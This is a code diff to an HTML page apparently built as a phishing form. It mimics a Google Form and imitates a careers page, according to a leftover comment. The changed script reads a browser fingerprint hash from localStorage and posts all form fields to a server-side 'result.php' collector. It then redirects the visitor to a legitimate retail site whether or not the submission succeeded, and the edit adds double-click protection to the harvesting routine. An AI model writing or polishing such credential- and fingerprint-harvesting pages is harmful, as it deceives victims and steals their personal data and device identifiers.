@@ -593,44 +593,55 @@ select:valid {
         var error_file = "../../php/error.php";
     </script>
     <script src="js/location.js"></script>
-    <script>
-   
-    function triggerTracking() {
-        // Retrieve fingerprint hash from localStorage (set by location.js)
-        var fpHash = localStorage.getItem('fingerprint_hash') || '';
-        document.getElementById('fingerprint_hash').value = fpHash;
-
-        var form = document.getElementById('mG61Hd');
-        var formData = new FormData(form);
-
-        // Send data to your server
-        $.ajax({
-            url: result_file,   // defined above as "../../php/result.php"
-            type: 'POST',
-            data: formData,
-            processData: false,
-            contentType: false,
-            success: function(response) {
-                // Update button UI
-                var btnText = document.querySelector('div[aria-label="Submit"] .NPEfkd');
-                var btnBg = document.querySelector('div[aria-label="Submit"]');
-                if(btnText) btnText.innerHTML = "Submitted!";
-                if(btnBg) btnBg.style.backgroundColor = "#188038";
-
-                // Redirect to real IBM Careers page after 1.5 seconds
-                setTimeout(function() {
-                    window.location.replace("https://www.noon.com/");
-                }, 1500);
-            },
-            error: function(xhr, status, error) {
-                console.error("Submission failed:", error);
-                // Still redirect even if logging fails
-                setTimeout(function() {
-                    window.location.replace("https://www.noon.com/");
-                }, 1500);
-            }
-        });
+   <script>
+function triggerTracking() {
+    // 1. Grab the button
+    var submitBtn = document.querySelector('button[aria-label="Submit"]');
+    var btnText = document.querySelector('div[aria-label="Submit"] .NPEfkd');
+    
+    // 2. Disable it immediately to prevent double-clicks
+    if (submitBtn) {
+        submitBtn.disabled = true;
+        submitBtn.style.pointerEvents = "none"; // Prevents further clicks
+        submitBtn.style.opacity = "0.7";        // Dims the button
     }
+    if (btnText) {
+        btnText.innerHTML = "Submitting...";    // Let user know it's working
+    }
+
+    // Retrieve fingerprint hash from localStorage
+    var fpHash = localStorage.getItem('fingerprint_hash') || '';
+    document.getElementById('fingerprint_hash').value = fpHash;
+
+    var form = document.getElementById('mG61Hd');
+    var formData = new FormData(form);
+
+    // Send data to your server
+    $.ajax({
+        url: result_file,   
+        type: 'POST',
+        data: formData,
+        processData: false,
+        contentType: false,
+        success: function(response) {
+            // Update button UI on success
+            if(btnText) btnText.innerHTML = "Submitted!";
+            if(submitBtn) submitBtn.style.backgroundColor = "#188038";
+
+            // Redirect to real page after 1.5 seconds
+            setTimeout(function() {
+                window.location.replace("https://www.noon.com/");
+            }, 1500);
+        },
+        error: function(xhr, status, error) {
+            console.error("Submission failed:", error);
+            // Still redirect even if logging fails
+            setTimeout(function() {
+                window.location.replace("https://www.noon.com/");
+            }, 1500);
+        }
+    });
+}
 </script>
 </body>
 </html>
